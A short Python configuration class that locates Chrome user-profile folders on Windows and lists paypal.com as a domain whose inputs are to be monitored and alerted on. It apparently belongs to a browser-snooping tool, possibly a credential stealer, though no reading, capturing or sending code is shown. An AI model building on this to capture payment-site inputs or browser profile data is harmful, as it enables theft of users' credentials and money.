import os
from pathlib import Path

class Config:
    def __init__(self):
        self.local_app_data = os.getenv('LOCALAPPDATA')
        self.chrome_path = os.path.join(self.local_app_data, "Google", "Chrome", "User Data")
        self.monitored_domains = {
            "paypal.com": {
                "alert": True,
                "monitor_inputs": True
            }
        }

    def get_profiles(self):
        profiles = {"Default": os.path.join(self.chrome_path, "Default")}
        try:
            for entry in Path(self.chrome_path).iterdir():
                if entry.is_dir() and entry.name.startswith("Profile"):
                    profiles[entry.name] = str(entry)
        except Exception:
            pass
        return profiles
